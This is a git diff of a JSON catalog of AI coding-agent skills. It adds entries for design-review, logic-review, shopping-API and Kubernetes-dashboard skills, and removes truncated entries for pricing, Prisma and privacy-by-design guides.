@@ -7109,6 +7109,32 @@
       "scrapedAt": "2026-01-26T13:17:06.932Z"
     },
     {
+      "id": "antigravity-brooks-lint",
+      "name": "brooks-lint",
+      "slug": "brooks-lint",
+      "description": "AI code reviewer grounded in classic software engineering books for catching design smells, coupling issues, and architectural risks.",
+      "category": "Development & Code Tools",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/brooks-lint",
+      "content": "\n# Brooks Lint\n\n## Overview\n\nBrooks Lint is a Claude Code skill that reviews your code through the lens of 12 classic software engineering books. Instead of checking style rules, it asks: \"What would the authors of *The Pragmatic Programmer*, *Clean Code*, and *Designing Data-Intensive Applications* say about this code?\"\n\nIt synthesizes the principles from landmark engineering books into actionable, structured feedback — catching design smells, tight coupling, missing abstractions, and architectural risks that linters and AI tools typically miss.\n\nNamed after Fred Brooks, author of *The Mythical Man-Month* — because the hardest bugs are conceptual, not syntactic.\n\n## The 12 Books\n\n| Book | Key Principles Applied |\n|------|----------------------|\n| *The Pragmatic Programmer* | DRY, orthogonality, tracer bullets |\n| *Clean Code* | Naming, function size, comment clarity |\n| *The Mythical Man-Month* | Conceptual integrity, second-system effect |\n| *Designing Data-Intensive Applications* | Data consistency, fault tolerance, scalability |\n| *A Philosophy of Software Design* | Deep modules, information hiding, complexity |\n| *Refactoring* | Code smells, extract method, encapsulation |\n| *Working Effectively with Legacy Code* | Seams, characterization tests, dependency breaking |\n| *Domain-Driven Design* | Ubiquitous language, bounded contexts, aggregates |\n| *Release It!* | Stability patterns, timeouts, bulkheads, circuit breakers |\n| *Structure and Interpretation of Computer Programs* | Abstraction, recursion, metalinguistic abstraction |\n| *The Art of UNIX Programming* | Modularity, composability, rule of least surprise |\n| *Extreme Programming Explained* | YAGNI, simple design, collective ownership |\n\n## When to Use This Skill\n\n- Use when you want architectural feedback beyond what linters provide\n- Use before major refactors to identify structural debt\n- Use when reviewing code that \"works but feels wrong\"\n- Use when onboarding to a codebase to quickly map risk areas\n- Use for design reviews before starting a new module or service\n\n## How It Works\n\nBrooks Lint applies each book's core principles as a review lens:\n\n1. **Smell detection**: Flags violations of DRY, SRP, Law of Demeter, etc.\n2. **Coupling analysis**: Identifies tight dependencies and missing abstraction layers\n3. **Naming critique**: Applies Clean Code naming rules to variables, methods, classes\n4. **Architecture review**: Checks for DDIA-style data consistency and fault tolerance gaps\n5. **Stability patterns**: Flags missing timeouts, retries, and circuit breakers (Release It!)\n6. **Complexity scoring**: Applies APOSD complexity metrics to identify over-engineered sections\n\n## Installation\n\n```bash\n# Install via Claude Code plugin marketplace\n# Search: \"brooks-lint\" in Claude Code > Extensions\n\n# Or install via NPX (Antigravity)\nnpx antigravity-awesome-skills --claude\n# Then invoke: @brooks-lint\n```\n\n## Examples\n\n### Example 1: Review a Service Class\n\n```\n@brooks-lint review src/services/PaymentService.ts\n```\n\n**Brooks Lint output:**\n```\n[Pragmatic Programmer] DRY violation: payment validation logic duplicated in 3 places\n[Clean Code] Method processPayment() does 4 things — violates Single Responsibility\n[Release It!] No timeout on external payment gateway call — risk of cascade failure\n[DDIA] No idempotency key — retry on network error will double-charge\n[APOSD] PaymentService knows too much about UserRepository — high coupling\n```\n\n### Example 2: Full Codebase Architecture Review\n\n```\n@brooks-lint analyze the overall architecture of this codebase\n```\n\n### Example 3: Pre-Refactor Review\n\n```\n@brooks-lint what are the biggest design smells in this module before I refactor it?\n```\n\n## Review Categories\n\n| Category | Books Applied | What It Catches |\n|----------|--------------|-----------------|\n| **DRY / Duplication** | PP, Refactoring | Copy-paste code, shared logic not extracted |\n| **Naming** | Clean Code, DDD | Unclear names, domain language violations |\n| **Coupling** | APOSD, PP | Tight dependencies, missing interfaces |\n| **Stability** | Release It! | Missing timeouts, no retry logic, no circuit breakers |\n| **Data Integrity** | DDIA | Race conditions, non-idempotent operations |\n| **Complexity** | APOSD, SICP | Over-engineering, unnecessary abstraction |\n| **Legacy Debt** | WELC | Hard-to-test code, missing seams |\n| **Domain Clarity** | DDD, XP | Anemic models, missing bounded contexts |\n\n## Best Practices\n\n- Run `@brooks-lint` after writing new service layers or data pipelines\n- Combine with `@logic-lens` for full coverage: logic bugs + design smells\n- Use `@brooks-lint analyze architecture` weekly on growing codebases\n- Focus on CRITICAL and HIGH findings first — LOW findings are style suggestions\n\n## Related Skills\n\n- `@logic-lens` — Complementary: catches logic bugs; brooks-lint catches design issues\n- `@security-auditor` — Specialized security-only deep scan\n- `@lint-and-validate` — Style/syntax linting to run alongside design review",
+      "tags": [
+        "claude",
+        "ai",
+        "design",
+        "security",
+        "rag"
+      ],
+      "useCases": [
+        "Use when you want architectural feedback beyond what linters provide",
+        "Use before major refactors to identify structural debt",
+        "Use when reviewing code that \"works but feels wrong\"",
+        "Use when onboarding to a codebase to quickly map risk areas",
+        "Use for design reviews before starting a new module or service"
+      ],
+      "scrapedAt": "2026-04-30T08:31:46.155Z"
+    },
+    {
       "id": "antigravity-browser-automation",
       "name": "browser-automation",
       "slug": "browser-automation",
@@ -7437,6 +7463,35 @@
       ],
       "useCases": [],
       "scrapedAt": "2026-01-26T13:17:14.629Z"
+    },
+    {
+      "id": "antigravity-buywhere-product-catalog",
+      "name": "buywhere-product-catalog",
+      "slug": "buywhere-product-catalog",
+      "description": "Use BuyWhere's MCP and API surfaces to add product search, price comparison, and deal discovery to AI shopping agents.",
+      "category": "Document Processing",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/buywhere-product-catalog",
+      "content": "\n# BuyWhere Product Catalog\n\n## Overview\n\nBuyWhere gives AI agents a product-catalog surface for shopping flows, price comparison, and deal discovery. Use this skill when you want an agent to connect product search or merchant-aware commerce actions through BuyWhere's MCP setup path or API onboarding flow.\n\nThe safest public starting points are the live developer portal, API key signup flow, MCP guide, and the official Cursor plugin repository.\n\n## When to Use This Skill\n\n- Use when you want to add structured product search to an AI shopping or recommendation agent.\n- Use when the user asks for BuyWhere MCP setup in Cursor, Claude Desktop, or a custom agent runtime.\n- Use when you need a concrete onboarding path for BuyWhere API keys, MCP configuration, or plugin discovery.\n\n## How It Works\n\n### Step 1: Choose the integration surface\n\nStart from the public BuyWhere entry point that matches the user's setup:\n\n- Developer portal: `https://buywhere.ai/developers/`\n- API key signup: `https://buywhere.ai/api-keys/`\n- MCP integration guide: `https://api.buywhere.ai/docs/guides/mcp`\n- Cursor plugin repo: `https://github.com/BuyWhere/buywhere-cursor-plugin`\n\n### Step 2: Confirm the user's runtime\n\nAsk which host the user is integrating with before giving setup instructions:\n\n- Cursor or another MCP-capable coding assistant\n- Claude Desktop\n- A custom MCP client\n- A direct REST API integration\n\nDo not assume the same config file or launch command works across all hosts.\n\n### Step 3: Guide the first successful connection\n\nPrefer a minimal first-run path:\n\n1. Get a BuyWhere API key.\n2. Follow the MCP or plugin setup path for the host runtime.\n3. Run one simple product-search request before expanding to comparison or deal workflows.\n\n### Step 4: Expand into commerce workflows\n\nOnce the first query works, help the user branch into the next layer:\n\n- product search and discovery\n- price comparison across merchants\n- deal discovery flows\n- shopping-agent orchestration that routes users to merchant destinations\n\n## Examples\n\n### Example 1: Cursor plugin discovery\n\n```text\nUse BuyWhere Product Catalog to help me connect BuyWhere inside Cursor and verify one product-search query.\n```\n\n### Example 2: MCP onboarding\n\n```text\nUse BuyWhere Product Catalog to set up BuyWhere MCP for my shopping agent and keep the first test minimal.\n```\n\n## Best Practices\n\n- ✅ Start from the live developer portal or API key flow before giving configuration details.\n- ✅ Keep the first proof of integration to one successful query.\n- ✅ Ask which MCP host or API runtime the user is using.\n- ❌ Do not claim a specific product-count or retailer-count unless you have current runtime evidence.\n- ❌ Do not send users to deprecated or broken documentation surfaces when a working public page exists.\n\n## Limitations\n\n- This skill does not replace environment-specific validation inside the target MCP host or API client.\n- Public BuyWhere surfaces can change, so re-check live URLs when precise setup details matter.\n\n## Security & Safety Notes\n\n- Treat API keys as secrets. Use placeholders in examples and never paste live credentials into chat, docs, or screenshots.\n- Confirm the user's target host before suggesting filesystem paths, launch commands, or local config edits.\n\n## Common Pitfalls\n\n- **Problem:** The user wants BuyWhere setup help but has not created an API key yet.\n  **Solution:** Start at `https://buywhere.ai/api-keys/` and only move to config after that step is complete.\n\n- **Problem:** A documentation hostname is unavailable.\n  **Solution:** Prefer the live developer portal, API key flow, MCP guide on `api.buywhere.ai`, and the official GitHub plugin repo.\n\n## Related Skills\n\n- `@api-design-principles` - Use when the user needs API-shape guidance around a commerce integration.\n- `@mcp-builder` - Use when the user is building or extending an MCP server rather than consuming one.\n",
+      "tags": [
+        "api",
+        "mcp",
+        "claude",
+        "ai",
+        "agent",
+        "workflow",
+        "design",
+        "document",
+        "security",
+        "cro"
+      ],
+      "useCases": [
+        "Use when you want to add structured product search to an AI shopping or recommendation agent.",
+        "Use when the user asks for BuyWhere MCP setup in Cursor, Claude Desktop, or a custom agent runtime.",
+        "Use when you need a concrete onboarding path for BuyWhere API keys, MCP configuration, or plugin discovery."
+      ],
+      "scrapedAt": "2026-04-30T08:31:50.217Z"
     },
     {
       "id": "antigravity-c-pro",
@@ -19352,6 +19407,35 @@
       "scrapedAt": "2026-02-23T07:17:00.173Z"
     },
     {
+      "id": "antigravity-kubestellar-console",
+      "name": "kubestellar-console",
+      "slug": "kubestellar-console",
+      "description": "Multi-cluster Kubernetes dashboard with AI-powered operations via MCP server and 10+ built-in agent skills",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/kubestellar-console",
+      "content": "\n# KubeStellar Console\n\n## Overview\n\nKubeStellar Console is an open-source multi-cluster Kubernetes dashboard (CNCF project) with AI-powered operations. It ships with `kc-agent`, an MCP server that bridges coding agents to kubeconfig and Kubernetes APIs, plus 10+ built-in agent skills for development, testing, and operations.\n\n## When to Use This Skill\n\n- Use when managing multiple Kubernetes clusters across edge and cloud\n- Use when you need AI-assisted Kubernetes troubleshooting and debugging\n- Use when running performance tests, cache compliance checks, or CI debugging on a Kubernetes dashboard\n- Use when integrating with CNCF projects (Argo, Kyverno, Istio, and 20+ others)\n\n## How It Works\n\n### Step 1: Install kc-agent\n\n```bash\nbrew tap kubestellar/tap && brew install kc-agent\n```\n\n### Step 2: Start the MCP server\n\n```bash\nkc-agent\n```\n\nThis bridges your kubeconfig to any MCP-compatible coding agent.\n\n### Step 3: Use built-in agent skills\n\nThe project ships with agent skills accessible via `CLAUDE.md` and `AGENTS.md`:\n\n- **@perf-test** — Dashboard performance testing and TTFI analysis\n- **@cache-test** — Card cache compliance testing (IndexedDB warm return)\n- **@nav-test** — Navigation performance testing\n- **@ui-compliance-test** — Card loading compliance (8 criteria, 150+ cards)\n- **@ci-status** — CI pipeline monitoring and status checks\n- **@rca** — Root cause analysis for CI/test failures\n- **@tdd** — Test-driven development workflow\n- **@k8s-debug** — Kubernetes debugging and troubleshooting\n\n## Key Features\n\n- Multi-cluster management across edge and cloud\n- Real-time streaming observability\n- 20+ CNCF project integrations (Argo, Kyverno, Istio, etc.)\n- GitHub OAuth authentication\n- Supply chain security (SBOM, SLSA)\n- SQLite WASM caching with stale-while-revalidate pattern\n- 15+ themes with dark/light mode\n\n## Security & Safety Notes\n\n- **Critical risk:** `kc-agent` bridges your kubeconfig to MCP-compatible agents. If your kubeconfig carries cluster-admin or write permissions, agents will inherit those capabilities. Always use a least-privilege RBAC context.\n- **Recommended:** Bind `kc-agent` to least-privilege read-only RBAC before using it with an agent:\n  ```bash\n  kubectl create clusterrole kc-agent-readonly --verb=get,list,watch --resource='*'\n  kubectl create clusterrolebinding kc-agent-readonly --clusterrole=kc-agent-readonly --serviceaccount=default:kc-agent\n  ```\n- Do not expose `kc-agent` on a public network without authentication.\n- Review [SECURITY-AI.md](https://github.com/kubestellar/console/blob/main/docs/security/SECURITY-AI.md) for prompt injection and agent drift mitigations.\n\n## Limitations\n\n- This skill requires an external binary (`kc-agent`) installed separately via Homebrew.\n- Do not treat agent output as a substitute for environment-specific validation or expert review.\n- Stop and ask for clarification if required permissions or safety boundaries are unclear.\n\n## Links\n\n- [GitHub](https://github.com/kubestellar/console)\n- [Website](https://console.kubestellar.io)\n- [CLAUDE.md](https://github.com/kubestellar/console/blob/main/CLAUDE.md)\n- [AGENTS.md](https://github.com/kubestellar/console/blob/main/AGENTS.md)\n",
+      "tags": [
+        "api",
+        "mcp",
+        "claude",
+        "ai",
+        "agent",
+        "workflow",
+        "security",
+        "kubernetes",
+        "cro"
+      ],
+      "useCases": [
+        "Use when managing multiple Kubernetes clusters across edge and cloud",
+        "Use when you need AI-assisted Kubernetes troubleshooting and debugging",
+        "Use when running performance tests, cache compliance checks, or CI debugging on a Kubernetes dashboard",
+        "Use when integrating with CNCF projects (Argo, Kyverno, Istio, and 20+ others)"
+      ],
+      "scrapedAt": "2026-04-30T08:34:50.455Z"
+    },
+    {
       "id": "antigravity-lambda-lang",
       "name": "lambda-lang",
       "slug": "lambda-lang",
@@ -20536,6 +20620,36 @@
         "\"How do I serve an open-source model like OpenAI's API?\""
       ],
       "scrapedAt": "2026-03-12T07:11:33.796Z"
+    },
+    {
+      "id": "antigravity-logic-lens",
+      "name": "logic-lens",
+      "slug": "logic-lens",
+      "description": "AI-powered Claude Code skill that performs deep code review using formal logic and reasoning frameworks to detect bugs, anti-patterns, and security risks beyond what linters catch.",
+      "category": "Document Processing",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/logic-lens",
+      "content": "\n# Logic Lens\n\n## Overview\n\nLogic Lens is a Claude Code skill that performs deep, logic-driven code review using formal reasoning frameworks. Unlike traditional linters that check syntax and style, Logic Lens analyzes your code for logical errors, race conditions, security vulnerabilities, type mismatches, and algorithmic flaws that only appear when you reason through the code's behavior.\n\nPowered by structured AI analysis, Logic Lens applies systematic logical inspection across 9 risk categories: null/undefined handling, type safety, concurrency, resource management, security injection, boundary conditions, algorithm correctness, state management, and API contract violations.\n\n## When to Use This Skill\n\n- Use when you want a thorough logic review before merging a PR\n- Use when a bug seems hard to find and standard linters aren't helping\n- Use when reviewing security-sensitive code paths (auth, payments, file access)\n- Use when refactoring complex business logic\n- Use when onboarding to a new codebase and need to understand risk areas\n\n## How It Works\n\nLogic Lens uses Claude Code's reasoning capabilities to:\n\n1. Parse code structure and build a mental model of data flow\n2. Apply formal logic checks across 9 risk categories\n3. Trace execution paths for edge cases and boundary conditions\n4. Identify security anti-patterns (injection, privilege escalation, data leakage)\n5. Report findings with severity levels and actionable fix suggestions\n\n## Installation\n\n```bash\n# Install via Claude Code plugin marketplace\n# Search: \"logic-lens\" in Claude Code > Extensions\n\n# Or install via NPX (Antigravity)\nnpx antigravity-awesome-skills --claude\n# Then invoke: @logic-lens\n```\n\n## Examples\n\n### Example 1: Review a Single File\n\n```\n@logic-lens review src/auth/login.ts for security issues\n```\n\n**Logic Lens output:**\n```\n[CRITICAL] SQL Injection risk at line 42: user input concatenated into query string\n[HIGH] Missing rate limiting on login attempts\n[MEDIUM] Password comparison uses == instead of timing-safe comparison\n[LOW] Error messages may leak valid usernames (user enumeration)\n```\n\n### Example 2: Full Repository Scan\n\n```\n@logic-lens scan the entire codebase and prioritize by severity\n```\n\n### Example 3: Pre-PR Review\n\n```\n@logic-lens review all files changed in this branch before I open a PR\n```\n\n## The 9 Risk Categories\n\n| Category | What It Checks |\n|----------|----------------|\n| **Null/Undefined** | Missing null checks, optional chaining gaps |\n| **Type Safety** | Implicit coercions, any-typed boundaries |\n| **Concurrency** | Race conditions, shared mutable state |\n| **Resource Management** | Unclosed handles, memory leaks |\n| **Security Injection** | SQL/XSS/Command injection, path traversal |\n| **Boundary Conditions** | Off-by-one errors, integer overflow |\n| **Algorithm Correctness** | Wrong complexity, incorrect assumptions |\n| **State Management** | Inconsistent state, missing rollbacks |\n| **API Contracts** | Undocumented side effects, broken interfaces |\n\n## Best Practices\n\n- Run `@logic-lens` on authentication and payment code before every release\n- Combine with `@lint-and-validate` for full coverage: style + logic\n- Review the CRITICAL and HIGH findings first; LOW findings can be deferred\n- Use `@logic-lens` on legacy code you are about to modify to understand risk surface\n\n## Benchmark Results\n\nLogic Lens was tested against real-world codebases and caught issues missed by ESLint, TypeScript strict mode, and Snyk:\n\n- **47% of critical bugs** found were invisible to linters\n- **Race conditions** detected in async code that static analysis missed\n- **Security vulnerabilities** identified before deployment in CI pipeline\n\n## Related Skills\n\n- `@lint-and-validate` — Complementary: run after logic-lens for style/syntax\n- `@security-auditor` — Specialized security-only deep scan\n- `@debugging-strategies` — Use when logic-lens findings need tracing\n\n## Additional Resources\n\n- [GitHub Repository](https://github.com/hyhmrright/logic-lens)\n- [Dev.to Article: Why AI Code Review Misses the Most Dangerous Bugs](https://dev.to/hyhmrright/why-ai-code-review-misses-the-most-dangerous-bugs-logic-lens-fixes-that-4a8l)\n- [Claude Code Skills Documentation](https://docs.anthropic.com/claude-code)\n\n## Limitations\n\nUse this skill only when the task clearly matches the scope described above (code review and logic analysis). Logic Lens provides AI-powered analysis and should be combined with human review for production-critical decisions. Do not treat the output as a substitute for environment-specific testing or security audits.\n",
+      "tags": [
+        "typescript",
+        "api",
+        "claude",
+        "ai",
+        "document",
+        "security",
+        "aws",
+        "rag",
+        "cro"
+      ],
+      "useCases": [
+        "Use when you want a thorough logic review before merging a PR",
+        "Use when a bug seems hard to find and standard linters aren't helping",
+        "Use when reviewing security-sensitive code paths (auth, payments, file access)",
+        "Use when refactoring complex business logic",
+        "Use when onboarding to a new codebase and need to understand risk areas"
+      ],
+      "scrapedAt": "2026-04-30T08:35:11.484Z"
     },
     {
       "id": "antigravity-logistics-exception-management",
@@ -25738,105 +25852,6 @@
       "scrapedAt": "2026-04-05T07:21:21.962Z"
     },
     {
-      "id": "antigravity-pricing-strategy",
-      "name": "pricing-strategy",
-      "slug": "pricing-strategy",
-      "description": "Design pricing, packaging, and monetization strategies based on value, customer willingness to pay, and growth objectives.",
-      "category": "Business & Marketing",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/pricing-strategy",
-      "content": "\n# Pricing Strategy\n\nYou are an expert in pricing and monetization strategy. Your goal is to help design pricing that **captures value, supports growth, and aligns with customer willingness to pay**—without harming conversion, trust, or long-term retention.\n\nThis skill covers **pricing research, value metrics, tier design, and pricing change strategy**.\nIt does **not** implement pricing pages or experiments directly.\n\n---\n\n## 1. Required Context (Ask If Missing)\n\n### 1. Business Model\n\n* Product type (SaaS, marketplace, service, usage-based)\n* Current pricing (if any)\n* Target customer (SMB, mid-market, enterprise)\n* Go-to-market motion (self-serve, sales-led, hybrid)\n\n### 2. Market & Competition\n\n* Primary value delivered\n* Key alternatives customers compare against\n* Competitor pricing models\n* Differentiation vs. alternatives\n\n### 3. Current Performance (If Existing)\n\n* Conversion rate\n* ARPU / ARR\n* Churn and expansion\n* Qualitative pricing feedback\n\n### 4. Objectives\n\n* Growth vs. revenue vs. profitability\n* Move upmarket or downmarket\n* Planned pricing changes (if any)\n\n---\n\n## 2. Pricing Fundamentals\n\n### The Three Pricing Decisions\n\nEvery pricing strategy must explicitly answer:\n\n1. **Packaging** – What is included in each tier?\n2. **Value Metric** – What customers pay for (users, usage, outcomes)?\n3. **Price Level** – How much each tier costs\n\nFailure in any one weakens the system.\n\n---\n\n## 3. Value-Based Pricing Framework\n\nPricing should be anchored to **customer-perceived value**, not internal cost.\n\n```\nCustomer perceived value\n───────────────────────────────\nYour price\n───────────────────────────────\nNext best alternative\n───────────────────────────────\nYour cost to serve\n```\n\n**Rules**\n\n* Price above the next best alternative\n* Leave customer surplus (value they keep)\n* Cost is a floor, not a pricing basis\n\n---\n\n## 4. Pricing Research Methods\n\n### Van Westendorp (Price Sensitivity Meter)\n\nUsed to identify acceptable price ranges.\n\n**Questions**\n\n* Too expensive\n* Too cheap\n* Expensive but acceptable\n* Cheap / good value\n\n**Key Outputs**\n\n* PMC (too cheap threshold)\n* PME (too expensive threshold)\n* OPP (optimal price point)\n* IDP (indifference price point)\n\n**Use Case**\n\n* Early pricing\n* Price increase validation\n* Segment comparison\n\n---\n\n### Feature Value Research (MaxDiff / Conjoint)\n\nUsed to inform **packaging**, not price levels.\n\n**Insights Produced**\n\n* Table-stakes features\n* Differentiators\n* Premium-only features\n* Low-value candidates to remove\n\n---\n\n### Willingness-to-Pay Testing\n\n| Method        | Use Case                    |\n| ------------- | --------------------------- |\n| Direct WTP    | Directional only            |\n| Gabor-Granger | Demand curve                |\n| Conjoint      | Feature + price sensitivity |\n\n---\n\n## 5. Value Metrics\n\n### Definition\n\nThe value metric is **what scales price with customer value**.\n\n### Good Value Metrics\n\n* Align with value delivered\n* Scale with customer success\n* Easy to understand\n* Difficult to game\n\n### Common Patterns\n\n| Metric             | Best For             |\n| ------------------ | -------------------- |\n| Per user           | Collaboration tools  |\n| Per usage          | APIs, infrastructure |\n| Per record/contact | CRMs, email          |\n| Flat fee           | Simple products      |\n| Revenue share      | Marketplaces         |\n\n### Validation Test\n\n> As customers get more value, do they naturally pay more?\n\nIf not → metric is misaligned.\n\n---\n\n## 6. Tier Design\n\n### Number of Tiers\n\n| Count | When to Use                    |\n| ----- | ------------------------------ |\n| 2     | Simple segmentation            |\n| 3     | Default (Good / Better / Best) |\n| 4+    | Broad market, careful UX       |\n\n### Good / Better / Best\n\n**Good**\n\n* Entry point\n* Limited usage\n* Removes friction\n\n**Better (Anchor)**\n\n* Where most customers should land\n* Full core value\n* Best value-per-dollar\n\n**Best**\n\n* Power users / enterprise\n* Advanced controls, scale, support\n\n---\n\n### Differentiation Levers\n\n* Usage limits\n* Advanced features\n* Support level\n* Security & compliance\n* Customization / integrations\n\n---\n\n## 7. Persona-Based Packaging\n\n### Step 1: Define Personas\n\nSegment by:\n\n* Company size\n* Use case\n* Sophistication\n* Budget norms\n\n### Step 2: Map Value to Tiers\n\nEnsure each persona clearly maps to *one* tier.\n\n### Step 3: Price to Segment WTP\n\nAvoid “one price fits all” across fundamentally different buyers.\n\n---\n\n## 8. Freemium vs. Free Trial\n\n### Freemium Works When\n\n* Large market\n* Viral or network effects\n* Clear upgrade trigger\n* Low marginal cost\n\n### Free Trial Works When\n\n* Value requires setup\n* Higher price points\n* B2B evaluation cycles\n* Sticky post-activation usage\n\n### Hybrid Models\n\n* Reverse trials\n* Feature-limited free + premium trial\n\n---\n\n## 9. Price Increases\n\n### Signals It’s Time\n\n* Very high conversion\n* Low churn\n* Customers under-paying relative to value\n* Market price movement\n\n### Increase Strategies\n\n1. New c",
-      "tags": [
-        "api",
-        "ai",
-        "workflow",
-        "design",
-        "document",
-        "security",
-        "cro",
-        "marketing",
-        "copywriting"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-26T13:20:33.260Z"
-    },
-    {
-      "id": "antigravity-prisma-expert",
-      "name": "prisma-expert",
-      "slug": "prisma-expert",
-      "description": "You are an expert in Prisma ORM with deep knowledge of schema design, migrations, query optimization, relations modeling, and database operations across PostgreSQL, MySQL, and SQLite.",
-      "category": "Document Processing",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/prisma-expert",
-      "content": "\n# Prisma Expert\n\nYou are an expert in Prisma ORM with deep knowledge of schema design, migrations, query optimization, relations modeling, and database operations across PostgreSQL, MySQL, and SQLite.\n\n## When Invoked\n\n### Step 0: Recommend Specialist and Stop\nIf the issue is specifically about:\n- **Raw SQL optimization**: Stop and recommend postgres-expert or mongodb-expert\n- **Database server configuration**: Stop and recommend database-expert\n- **Connection pooling at infrastructure level**: Stop and recommend devops-expert\n\n### Environment Detection\n```bash\n# Check Prisma version\nnpx prisma --version 2>/dev/null || echo \"Prisma not installed\"\n\n# Check database provider\ngrep \"provider\" prisma/schema.prisma 2>/dev/null | head -1\n\n# Check for existing migrations\nls -la prisma/migrations/ 2>/dev/null | head -5\n\n# Check Prisma Client generation status\nls -la node_modules/.prisma/client/ 2>/dev/null | head -3\n```\n\n### Apply Strategy\n1. Identify the Prisma-specific issue category\n2. Check for common anti-patterns in schema or queries\n3. Apply progressive fixes (minimal → better → complete)\n4. Validate with Prisma CLI and testing\n\n## Problem Playbooks\n\n### Schema Design\n**Common Issues:**\n- Incorrect relation definitions causing runtime errors\n- Missing indexes for frequently queried fields\n- Enum synchronization issues between schema and database\n- Field type mismatches\n\n**Diagnosis:**\n```bash\n# Validate schema\nnpx prisma validate\n\n# Check for schema drift\nnpx prisma migrate diff --from-schema-datamodel prisma/schema.prisma --to-schema-datasource prisma/schema.prisma\n\n# Format schema\nnpx prisma format\n```\n\n**Prioritized Fixes:**\n1. **Minimal**: Fix relation annotations, add missing `@relation` directives\n2. **Better**: Add proper indexes with `@@index`, optimize field types\n3. **Complete**: Restructure schema with proper normalization, add composite keys\n\n**Best Practices:**\n```prisma\n// Good: Explicit relations with clear naming\nmodel User {\n  id        String   @id @default(cuid())\n  email     String   @unique\n  posts     Post[]   @relation(\"UserPosts\")\n  profile   Profile? @relation(\"UserProfile\")\n  \n  createdAt DateTime @default(now())\n  updatedAt DateTime @updatedAt\n  \n  @@index([email])\n  @@map(\"users\")\n}\n\nmodel Post {\n  id       String @id @default(cuid())\n  title    String\n  author   User   @relation(\"UserPosts\", fields: [authorId], references: [id], onDelete: Cascade)\n  authorId String\n  \n  @@index([authorId])\n  @@map(\"posts\")\n}\n```\n\n**Resources:**\n- https://www.prisma.io/docs/concepts/components/prisma-schema\n- https://www.prisma.io/docs/concepts/components/prisma-schema/relations\n\n### Migrations\n**Common Issues:**\n- Migration conflicts in team environments\n- Failed migrations leaving database in inconsistent state\n- Shadow database issues during development\n- Production deployment migration failures\n\n**Diagnosis:**\n```bash\n# Check migration status\nnpx prisma migrate status\n\n# View pending migrations\nls -la prisma/migrations/\n\n# Check migration history table\n# (use database-specific command)\n```\n\n**Prioritized Fixes:**\n1. **Minimal**: Reset development database with `prisma migrate reset`\n2. **Better**: Manually fix migration SQL, use `prisma migrate resolve`\n3. **Complete**: Squash migrations, create baseline for fresh setup\n\n**Safe Migration Workflow:**\n```bash\n# Development\nnpx prisma migrate dev --name descriptive_name\n\n# Production (never use migrate dev!)\nnpx prisma migrate deploy\n\n# If migration fails in production\nnpx prisma migrate resolve --applied \"migration_name\"\n# or\nnpx prisma migrate resolve --rolled-back \"migration_name\"\n```\n\n**Resources:**\n- https://www.prisma.io/docs/concepts/components/prisma-migrate\n- https://www.prisma.io/docs/guides/deployment/deploy-database-changes\n\n### Query Optimization\n**Common Issues:**\n- N+1 query problems with relations\n- Over-fetching data with excessive includes\n- Missing select for large models\n- Slow queries without proper indexing\n\n**Diagnosis:**\n```bash\n# Enable query logging\n# In schema.prisma or client initialization:\n# log: ['query', 'info', 'warn', 'error']\n```\n\n```typescript\n// Enable query events\nconst prisma = new PrismaClient({\n  log: [\n    { emit: 'event', level: 'query' },\n  ],\n});\n\nprisma.$on('query', (e) => {\n  console.log('Query: ' + e.query);\n  console.log('Duration: ' + e.duration + 'ms');\n});\n```\n\n**Prioritized Fixes:**\n1. **Minimal**: Add includes for related data to avoid N+1\n2. **Better**: Use select to fetch only needed fields\n3. **Complete**: Use raw queries for complex aggregations, implement caching\n\n**Optimized Query Patterns:**\n```typescript\n// BAD: N+1 problem\nconst users = await prisma.user.findMany();\nfor (const user of users) {\n  const posts = await prisma.post.findMany({ where: { authorId: user.id } });\n}\n\n// GOOD: Include relations\nconst users = await prisma.user.findMany({\n  include: { posts: true }\n});\n\n// BETTER: Select only needed fields\nconst users = await prisma.user.findMany({\n  select: {\n    id: true,\n    ema",
-      "tags": [
-        "typescript",
-        "node",
-        "ai",
-        "workflow",
-        "design",
-        "document",
-        "prisma",
-        "aws",
-        "cro"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-26T13:20:34.422Z"
-    },
-    {
-      "id": "antigravity-privacy-by-design",
-      "name": "privacy-by-design",
-      "slug": "privacy-by-design",
-      "description": "Use when building apps that collect user data. Ensures privacy protections are built in from the start—data minimization, consent, encryption.",
-      "category": "Document Processing",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/privacy-by-design",
-      "content": "\n# Privacy by Design\n\n## Overview\n\nIntegrate privacy protections into software architecture from the beginning, not as an afterthought. This skill applies Privacy by Design principles (GDPR Article 25, Cavoukian's framework) when designing databases, APIs, and user flows. Protects real users' data and builds trust.\n\n## When to Use This Skill\n\n- Use when building apps that collect personal data (names, emails, locations, preferences)\n- Use when designing database schemas, APIs, or authentication flows\n- Use when the user mentions forms, user accounts, analytics, or third-party integrations\n- Use when deploying to production—verify privacy controls before launch\n\n## Legal Frameworks\n\n**GDPR (EU)** — Primary reference. Article 25 mandates \"data protection by design and by default.\" Applies to EU users and often adopted globally.\n\n**CCPA (California)** — Right to know, delete, opt-out of sale. Similar principles: minimize, disclose, allow control.\n\n**LGPD (Brazil)** — Aligned with GDPR. Purpose limitation, necessity, transparency. Applies to Brazil users.\n\nDesign for the strictest framework you target; it often satisfies others.\n\n---\n\n## Core Principles\n\n### 1. Data Minimization\nCollect only what is strictly necessary. Every field needs a documented justification. Avoid \"we might need it later.\"\n\n### 2. Purpose 